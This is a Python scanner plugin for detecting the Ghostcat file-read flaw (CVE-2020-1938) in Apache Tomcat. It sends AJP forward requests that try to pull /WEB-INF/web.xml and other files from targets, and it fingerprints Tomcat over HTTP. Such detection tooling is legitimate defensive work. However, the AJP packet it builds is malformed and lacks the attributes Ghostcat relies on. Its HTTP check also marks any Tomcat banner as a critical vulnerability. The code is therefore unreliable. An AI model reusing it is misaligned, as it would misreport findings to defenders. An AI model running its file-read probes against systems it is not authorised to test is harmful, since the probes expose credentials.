"""
Plugin 1090: Apache Tomcat AJP Connector File Read - Ghostcat (CVE-2020-1938)
================================================================================
Detects Ghostcat file read vulnerability in Apache Tomcat AJP connector.
Real CVE: CVE-2020-1938 (CVSS 9.8)
"""
import asyncio
import ssl
import struct

from plugins import NaslPlugin, PluginResult


class GhostcatDetection(NaslPlugin):
    PLUGIN_ID = 1090
    NAME = 'Apache Tomcat AJP Connector File Read (Ghostcat)'
    FAMILY = 'Web Servers'
    CVSS_SCORE = 9.8
    DESCRIPTION = (
        'Apache Tomcat 7.x before 7.0.100, 8.x before 8.5.51, and 9.x before 9.0.31 '
        'contains a file read vulnerability in the AJP connector. An attacker can '
        'read arbitrary files on the server, including WEB-INF/web.xml containing '
        'credentials.'
    )
    SOLUTION = (
        'Upgrade Apache Tomcat. Disable or firewall the AJP connector. Set the '
        'secretRequired attribute to true on the AJP connector.'
    )
    CVE = ['CVE-2020-1938']
    PORTS = [8009, 80, 443, 8080, 8443]

    TOMCAT_PATHS = [
        '/',
        '/examples/',
        '/manager/html',
        '/docs/',
        '/robots.txt',
    ]

    TOMCAT_HINTS = [
        b'Apache Tomcat',
        b'Tomcat',
        b'tomcat',
        b'Apache Software Foundation',
        b'Apache/',
        b'Tomcat Manager',
    ]

    @staticmethod
    def _build_ajp_forward_request(host_header: str, target_file: str) -> bytes:
        method_byte = 2
        protocol_byte = 1
        req_uri = target_file.encode()
        remote_addr = b'127.0.0.1'
        remote_host = b'localhost'
        server_name = host_header.encode()
        server_port = 8009
        is_ssl = 0

        prefix = struct.pack('>H', 0x1234)
        payload = struct.pack('B', method_byte)
        payload += struct.pack('B', protocol_byte)
        payload += struct.pack('>H', len(req_uri)) + req_uri
        payload += struct.pack('>H', len(remote_addr)) + remote_addr
        payload += struct.pack('>H', len(remote_host)) + remote_host
        payload += struct.pack('>H', len(server_name)) + server_name
        payload += struct.pack('>H', server_port)
        payload += struct.pack('B', is_ssl)
        payload += struct.pack('>H', 0)

        length = len(payload)
        return prefix + struct.pack('>H', length) + payload

    async def check_ajp_port(self, target: str, port: int) -> list[PluginResult]:
        results = []

        for target_file in ['/WEB-INF/web.xml', '/META-INF/MANIFEST.MF', '/index.jsp']:
            try:
                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port),
                    timeout=5
                )

                packet = self._build_ajp_forward_request(host_header, target_file)
                writer.write(packet)
                await writer.drain()

                response = b''
                try:
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                        if not chunk:
                            break
                        response += chunk
                        if len(response) > 8192:
                            break
                except asyncio.TimeoutError:
                    pass

                writer.close()
                await writer.wait_closed()

                if response and len(response) > 4:
                    body_start = response.find(b'\x00\x00')
                    body = response[body_start + 2:] if body_start != -1 else response
                    body_str = body.decode('utf-8', errors='ignore')

                    has_webxml = b'<web-app' in body or b'web-app' in body
                    has_servlet = b'<servlet' in body or b'servlet-class' in body
                    has_manifest = b'Manifest-Version' in body

                    if has_webxml or has_servlet or has_manifest:
                        results.append(PluginResult(
                            vulnerable=True,
                            target=target,
                            port=port,
                            cvss_score=self.CVSS_SCORE,
                            severity='critical',
                            description=(
                                f'Apache Tomcat AJP connector on port {port} exposed — '
                                f'file read confirmed via Ghostcat (CVE-2020-1938), '
                                f'retrieved: {target_file.split("/")[-1]}'
                            ),
                            solution=self.SOLUTION,
                            evidence=(
                                f'AJP request for {target_file} returned content — '
                                f'file contents readable via AJP protocol'
                            ),
                            references=[
                                'https://nvd.nist.gov/vuln/detail/CVE-2020-1938',
                                'https://www.apache.org/security/asf-2020-0019.html',
                            ]
                        ))
                        break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                pass

        return results

    async def check_web_port(self, target: str, port: int) -> list[PluginResult]:
        results = []

        try:
            scheme = 'https' if port in (443, 8443) else 'http'
            ctx = None
            if scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port, ssl=ctx),
                timeout=5
            )

            host_header = target
            if target in ('127.0.0.1', 'localhost', '::1'):
                host_header = 'alieninc.tech'

            for path in self.TOMCAT_PATHS:
                req = (
                    f'GET {path} HTTP/1.1\r\n'
                    f'Host: {host_header}\r\n'
                    f'User-Agent: Centra/1.0\r\n'
                    f'Connection: close\r\n\r\n'
                )
                writer.write(req.encode())
                await writer.drain()

                response = b''
                try:
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                        if not chunk:
                            break
                        response += chunk
                        if len(response) > 8192:
                            break
                except asyncio.TimeoutError:
                    pass

                if response:
                    status_line = response.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    is_200 = b'200 OK' in response[:50]
                    tomcat_hits = [h for h in self.TOMCAT_HINTS if h in response]

                    if is_200 and tomcat_hits:
                        results.append(PluginResult(
                            vulnerable=True,
                            target=target,
                            port=port,
                            cvss_score=self.CVSS_SCORE,
                            severity='critical',
                            description=(
                                f'Apache Tomcat detected on port {port} — '
                                f'AJP connector (port 8009) should be checked for Ghostcat (CVE-2020-1938)'
                            ),
                            solution=self.SOLUTION,
                            evidence=(
                                f'Path: {path}, Status: {status_line}, '
                                f'Tomcat hints: {tomcat_hits}'
                            ),
                            references=[
                                'https://nvd.nist.gov/vuln/detail/CVE-2020-1938',
                                'https://www.apache.org/security/asf-2020-0019.html',
                            ]
                        ))
                        break

            writer.close()
            await writer.wait_closed()

        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
            pass

        return results

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        if port is not None:
            if port == 8009:
                results.extend(await self.check_ajp_port(target, port))
            else:
                results.extend(await self.check_web_port(target, port))
        else:
            for p in self.PORTS:
                if p == 8009:
                    results.extend(await self.check_ajp_port(target, p))
                else:
                    results.extend(await self.check_web_port(target, p))

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No Apache Tomcat or Ghostcat indicators detected on checked ports'
            ))

        return results
